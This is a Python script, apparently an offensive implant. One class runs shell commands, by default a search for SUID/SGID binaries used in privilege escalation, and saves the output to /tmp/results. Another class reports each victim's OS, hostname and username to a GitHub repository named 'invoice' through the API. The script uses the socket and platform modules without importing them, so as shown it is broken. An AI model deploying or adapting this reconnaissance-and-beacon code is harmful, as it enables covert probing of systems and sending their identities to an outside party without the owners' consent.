import subprocess
import os
import requests
import base64
import getpass
import datetime

class Log():
    def __init__(self, repository_owner, repository_name, access_token):
        self.repository_owner = repository_owner
        self.repository_name = repository_name
        self.access_token = access_token

    def create_file(self, folder_path, script_name,status):
        # Get the current date and time
        current_datetime = datetime.datetime.now()   

        content = f"Script Name: {script_name}.\nExecution time: {current_datetime}\nStatus: {status}\n\n"
        username = getpass.getuser()

        hostname = socket.gethostname()
        os_name = platform.system()
        filename = os_name + "_" + hostname + "_" + username

        url = f"https://api.github.com/repos/{self.repository_owner}/{self.repository_name}/contents/{folder_path}/{filename}"
        headers = {
            'Authorization': f'token {self.access_token}',
            'Accept': 'application/vnd.github.v3+json'
        }

        # Check if the file already exists
        existing_file_url = f"https://api.github.com/repos/{self.repository_owner}/{self.repository_name}/contents/{folder_path}/{filename}"
        existing_file_response = requests.get(existing_file_url, headers=headers)
        
        if existing_file_response.status_code == 200:
            # File exists, append the new message to existing content
            existing_file_data = existing_file_response.json()
            sha = existing_file_data['sha']
            existing_content = base64.b64decode(existing_file_data['content']).decode()
            new_content = existing_content + '\n' + content

            data = {
                'message': 'Update log',
                'content': base64.b64encode(new_content.encode()).decode(),
                'sha': sha
            }

            response = requests.put(url, headers=headers, json=data)
            if response.status_code == 200:
                print("File updated successfully.")
            else:
                print("Failed to update file:", response.text)
        elif existing_file_response.status_code == 404:
            # File doesn't exist, create a new file
            data = {
                'message': 'New log',
                'content': base64.b64encode(content.encode()).decode()
            }

            response = requests.put(url, headers=headers, json=data)
            if response.status_code == 201:
                print("File created successfully.")
            else:
                print("Failed to create file:", response.text)
        else:
            print("Failed to check file existence:", existing_file_response.text)





class CommandExecutioner():
  def __init__(self, script_name):
    self.script_name = script_name
    
  def run_command(self,command="find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null", *args):
    full_command = "{} {}".format(command, ' '.join(args))
    result = subprocess.run(full_command, shell=True, capture_output=True, text=True)
    output = result.stdout.strip()

    destination_directory = "/tmp/results"
    if not os.path.exists(destination_directory):
       os.makedirs(destination_directory)

    try:
        with open(os.path.join(destination_directory, "result.txt"), "w") as f:
           f.write(output)
           file_creator.create_file("logs", self.script_name,"Script completed successfully")
    except:
        file_creator.create_file("logs",self.script_name,"Script may have encountered erros")

repository_owner = 'rsecurity12' 
repository_name = 'invoice' 
access_token = ''  
commandExecutioner = CommandExecutioner("CommandExecutioner")
file_creator = Log(repository_owner, repository_name, access_token)
